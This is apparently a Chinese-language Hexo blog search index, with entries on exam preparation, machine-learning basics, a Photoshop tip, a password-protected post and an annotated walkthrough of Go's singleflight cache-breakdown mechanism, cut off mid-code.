<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>在透明牢笼里奔跑</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%9C%A8%E9%80%8F%E6%98%8E%E7%89%A2%E7%AC%BC%E9%87%8C%E5%A5%94%E8%B7%91/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%9C%A8%E9%80%8F%E6%98%8E%E7%89%A2%E7%AC%BC%E9%87%8C%E5%A5%94%E8%B7%91/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请找作者确认" data-whm="文章校验失败">  <script id="hbeData" type="hbeData" data-hmacdigest="cadbcb29ee0b81faba26399d33893e6f4f6794a57e43c1508387bb937250efd0">8603c39cbbfb87213986a5e6689c52a8260048127344efa674e750a80f9be6242a4ca38d0ad046b93ddc1b6e872c6d920e0cc42b571ae4b563a351695591cc604c0f3a07d038c0f082063da020a517f124f635deae2bf0e7dfdb7d70f09ed624cce2827e8119a0f688557cdad1afe67212ea4098bda07599720270de9d1a47b0223276478778da1b80c7223f4fede40d4664f6fb482276ded63fdffa99d3b5761ae006dd2188f76866d697227ce1d38a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="请输入密码后查看">请输入密码后查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> private10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SDE-order</title>
      <link href="/uncatesgorized/SDE-order/"/>
      <url>/uncatesgorized/SDE-order/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SDE-find</title>
      <link href="/uncatesgorized/SDE-find/"/>
      <url>/uncatesgorized/SDE-find/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SDE-graph</title>
      <link href="/uncatesgorized/SDE-graph/"/>
      <url>/uncatesgorized/SDE-graph/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SDE-tree</title>
      <link href="/uncatesgorized/SDE-tree/"/>
      <url>/uncatesgorized/SDE-tree/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SDE-linked-list</title>
      <link href="/uncatesgorized/SDE-linked-list/"/>
      <url>/uncatesgorized/SDE-linked-list/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SDE-string</title>
      <link href="/uncatesgorized/SDE-string/"/>
      <url>/uncatesgorized/SDE-string/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>软件设计师-立项</title>
      <link href="/%E8%BD%AF%E8%80%83/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88-%E7%AB%8B%E9%A1%B9/"/>
      <url>/%E8%BD%AF%E8%80%83/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88-%E7%AB%8B%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>2025年5月考过中级软件设计师</li><li>开文档记录备考过程</li><li>知识点记录解析</li></ul><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol><li>计算机系统知识</li><li>程序设计语言基础</li><li>数据结构</li><li>操作系统知识</li><li>软件工程基础知识</li><li>结构化开发方法</li><li>面向对象技术</li><li>算法设计与分析</li><li>数据库技术基础</li><li>网络与信息安全基础知识</li><li>标准化和软件知识产权基础知识</li><li>软件系统分析与设计</li></ol><h2 id="错题知识点"><a href="#错题知识点" class="headerlink" title="错题知识点"></a>错题知识点</h2><p>todo</p>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习-1</title>
      <link href="/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p>科学：是什么，为什么</p><p>技术：怎么做</p><p>工程：做的多快好省</p><p>应用：五花八门</p><h4 id="经典定义"><a href="#经典定义" class="headerlink" title="经典定义"></a>经典定义</h4><p>利用经验改善系统自身的性能，经验&#x3D;数据。是主要研究智能数据分析的理论和方法。</p><p>PAC（Probably Approximately Correct）概率近似正确</p><p>$P(|F(x)-y|≤ϵ)≥1−δ$</p><p>任何一个有效的机器学习算法必有其偏好</p><p>若非必要，勿增实体</p><p>泛化误差</p><blockquote><p>在未来样本上的误差</p></blockquote><p>经验误差</p><blockquote><p>在训练集上的误差，亦称训练误差</p></blockquote><p>误差不是越小越好，容易过拟合</p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂-PS去痘印</title>
      <link href="/PS/%E6%9D%82-PS%E5%8E%BB%E7%97%98%E5%8D%B0/"/>
      <url>/PS/%E6%9D%82-PS%E5%8E%BB%E7%97%98%E5%8D%B0/</url>
      
        <content type="html"><![CDATA[<p>原图</p><img src="/Image/ps-before.jpeg" alt="" style="zoom:30%;" /><p>细节保留</p><img src="/Image/ps-after.jpg" alt="" style="zoom:30%;" /><p>加白</p><img src="/Image/ps-after2.jpg" alt="" style="zoom:30%;" /><p>教程地址 <a href="https://www.bilibili.com/read/cv6838407/">https://www.bilibili.com/read/cv6838407/</a></p>]]></content>
      
      
      <categories>
          
          <category> PS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-sync-SingleFlight</title>
      <link href="/Code/Code-Golang-SingleFlight/"/>
      <url>/Code/Code-Golang-SingleFlight/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h2><p>&emsp;&emsp;高并发场景下，为降低数据库压力，通常通过localcache、redis等设置缓存。接到请求后先从缓存读，如果存在则直接返回，否则需要从数据库读取，然后写到缓存。</p><p>&emsp;&emsp;通常查询数据库在整个请求流程中的耗时是最长的，高并发情况下，可能存在某个请求触发了读数据库的操作但没有返回和写入缓存，在这个期间后续的请求也触发相同的读请求，导致数据库瞬间请求量暴增或者直接被打死。</p><p>&emsp;&emsp;分布式锁可以解决这个问题，即第一个触发的请求加锁，等到写入缓存后释放锁。其他的请求只需要在发现有锁后等待并读取缓存数据即可。golang提供了更轻量的解决方法——singleFlight</p><h2 id="SingleFlight"><a href="#SingleFlight" class="headerlink" title="SingleFlight"></a>SingleFlight</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"errors"</span>    <span class="token string">"fmt"</span>    <span class="token string">"log"</span>    <span class="token string">"strconv"</span>    <span class="token string">"sync"</span>    <span class="token string">"time"</span>    <span class="token string">"golang.org/x/sync/singleflight"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>    g            singleflight<span class="token punctuation">.</span>Group    ErrCacheMiss <span class="token operator">=</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"cache miss"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroup    wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment">// 模拟10个并发</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">defer</span> wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            data<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>                log<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token punctuation">&#125;</span>            log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取数据</span><span class="token keyword">func</span> <span class="token function">load</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    data<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">loadFromCache</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> err <span class="token operator">==</span> ErrCacheMiss <span class="token punctuation">&#123;</span>        <span class="token comment">// 利用 singleflight 来归并请求</span>        v<span class="token punctuation">,</span> err<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> g<span class="token punctuation">.</span><span class="token function">Do</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            data<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">loadFromDB</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>            <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err            <span class="token punctuation">&#125;</span>            <span class="token function">setCache</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            <span class="token keyword">return</span> data<span class="token punctuation">,</span> <span class="token boolean">nil</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>            log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err        <span class="token punctuation">&#125;</span>        data <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> data<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token comment">// getDataFromCache 模拟从cache中获取值 cache miss</span><span class="token keyword">func</span> <span class="token function">loadFromCache</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> ErrCacheMiss<span class="token punctuation">&#125;</span><span class="token comment">// setCache 写入缓存</span><span class="token keyword">func</span> <span class="token function">setCache</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> data <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// getDataFromDB 模拟从数据库中获取值</span><span class="token keyword">func</span> <span class="token function">loadFromDB</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"query db"</span><span class="token punctuation">)</span>    unix <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">UnixNano</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> unix<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">query db<span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">17</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">13</span> <span class="token number">1626491053454483100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h4 id="Group"><a href="#Group" class="headerlink" title="Group"></a>Group</h4><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Group <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    mu sync<span class="token punctuation">.</span>Mutex       <span class="token comment">// protects m</span>    m  <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>call <span class="token comment">// lazily initialized，map的key就是唯一标识</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> call <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    wg sync<span class="token punctuation">.</span>WaitGroup    <span class="token comment">// 函数返回值和err信息</span>    val <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    err <span class="token builtin">error</span>    <span class="token comment">// 是否调用了 forget 方法</span>    forgotten <span class="token builtin">bool</span>    <span class="token comment">// 记录这个 key 被分享了多少次</span>    dups  <span class="token builtin">int</span>    chans <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">chan</span><span class="token operator">&lt;-</span> Result<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Do"><a href="#Do" class="headerlink" title="Do"></a>Do</h4><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>g <span class="token operator">*</span>Group<span class="token punctuation">)</span> <span class="token function">Do</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token punctuation">,</span> fn <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>v <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">,</span> shared <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> g<span class="token punctuation">.</span>m <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 懒加载</span>        g<span class="token punctuation">.</span>m <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>call<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 先判断 key 是否已经存在</span>    <span class="token keyword">if</span> c<span class="token punctuation">,</span> ok <span class="token operator">:=</span> g<span class="token punctuation">.</span>m<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span> ok <span class="token punctuation">&#123;</span> <span class="token comment">// 存在则说明有其他请求在同步执行，本次请求只需要等待即可</span>        c<span class="token punctuation">.</span>dups<span class="token operator">++</span>        g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// / 等待最先进来的那个请求执行完成，因为需要完成后才能获取到结果，这里用 wg 来阻塞，避免了手动写一个循环等待的逻辑</span>        <span class="token comment">// 这里区分 panic 错误和 runtime 的错误，避免出现死锁，后面可以看到为什么这么做</span>        <span class="token keyword">if</span> e<span class="token punctuation">,</span> ok <span class="token operator">:=</span> c<span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>panicError<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token punctuation">&#123;</span>            <span class="token function">panic</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>err <span class="token operator">==</span> errGoexit <span class="token punctuation">&#123;</span>            runtime<span class="token punctuation">.</span><span class="token function">Goexit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 最后直接从 call 对象中取出数据并返回</span>        <span class="token keyword">return</span> c<span class="token punctuation">.</span>val<span class="token punctuation">,</span> c<span class="token punctuation">.</span>err<span class="token punctuation">,</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 如果 key 不存在则会走到这里 new 一个 call 并执行</span>    c <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span>call<span class="token punctuation">)</span>    c<span class="token punctuation">.</span>wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    g<span class="token punctuation">.</span>m<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> c <span class="token comment">// 注意 这里在 Unlock 之前就把 call 写到 m 中了，所以 这部分逻辑只有第一次请求会执行</span>    g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment">// 然后我们调用 doCall 去执行</span>    g<span class="token punctuation">.</span><span class="token function">doCall</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> key<span class="token punctuation">,</span> fn<span class="token punctuation">)</span>    <span class="token keyword">return</span> c<span class="token punctuation">.</span>val<span class="token punctuation">,</span> c<span class="token punctuation">.</span>err<span class="token punctuation">,</span> c<span class="token punctuation">.</span>dups <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="doCall"><a href="#doCall" class="headerlink" title="doCall"></a>doCall</h4><p>defer的使用值得学习</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>g <span class="token operator">*</span>Group<span class="token punctuation">)</span> <span class="token function">doCall</span><span class="token punctuation">(</span>c <span class="token operator">*</span>call<span class="token punctuation">,</span> key <span class="token builtin">string</span><span class="token punctuation">,</span> fn <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 首先这两个 bool 用于标记是否正常返回或者触发了 recover</span>    normalReturn <span class="token operator">:=</span> <span class="token boolean">false</span>    recovered <span class="token operator">:=</span> <span class="token boolean">false</span>    <span class="token keyword">defer</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 如果既没有正常执行完毕，又没有 recover 那就说明需要直接退出了</span>        <span class="token keyword">if</span> <span class="token operator">!</span>normalReturn <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>recovered <span class="token punctuation">&#123;</span>            c<span class="token punctuation">.</span>err <span class="token operator">=</span> errGoexit        <span class="token punctuation">&#125;</span>        c<span class="token punctuation">.</span>wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 这里 done 之后前面的所有 wait 都会返回了</span>        g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">defer</span> g<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">// forgotten 默认值就是 false，所以默认就会调用 delete 移除掉 m 中的 key</span>        <span class="token keyword">if</span> <span class="token operator">!</span>c<span class="token punctuation">.</span>forgotten <span class="token punctuation">&#123;</span> <span class="token comment">// 然后这里也很巧妙，前面先调用了 done，于是所有等待的请求都返回了，那么这个c也没有用了，所以直接 delete 把这个 key 删掉，让后续的请求能再次触发 doCall，而不是直接从 m 中获取结果返回。</span>            <span class="token function">delete</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>m<span class="token punctuation">,</span> key<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> e<span class="token punctuation">,</span> ok <span class="token operator">:=</span> c<span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>panicError<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果返回的是 panic 错误，为了避免 channel 死锁，我们需要确保这个 panic 无法被恢复</span>            <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>chans<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">go</span> <span class="token function">panic</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">select</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// Keep this goroutine around so that it will appear in the crash dump.</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token function">panic</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>err <span class="token operator">==</span> errGoexit <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果是exitError就直接退出</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 这里就是正常逻辑了,往 channel 里写入数据</span>            <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> ch <span class="token operator">:=</span> <span class="token keyword">range</span> c<span class="token punctuation">.</span>chans <span class="token punctuation">&#123;</span>                ch <span class="token operator">&lt;-</span> Result<span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span>val<span class="token punctuation">,</span> c<span class="token punctuation">.</span>err<span class="token punctuation">,</span> c<span class="token punctuation">.</span>dups <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 使用匿名函数，保证下面的 defer 能在上一个defer之前执行</span>        <span class="token keyword">defer</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果不是正常退出那肯定是 panic 了</span>            <span class="token keyword">if</span> <span class="token operator">!</span>normalReturn <span class="token punctuation">&#123;</span>                 <span class="token comment">// 如果 panic 了我们就 recover 掉，然后 new 一个 panic 的错误后面在上层重新 panic</span>                <span class="token keyword">if</span> r <span class="token operator">:=</span> <span class="token function">recover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> r <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>                    c<span class="token punctuation">.</span>err <span 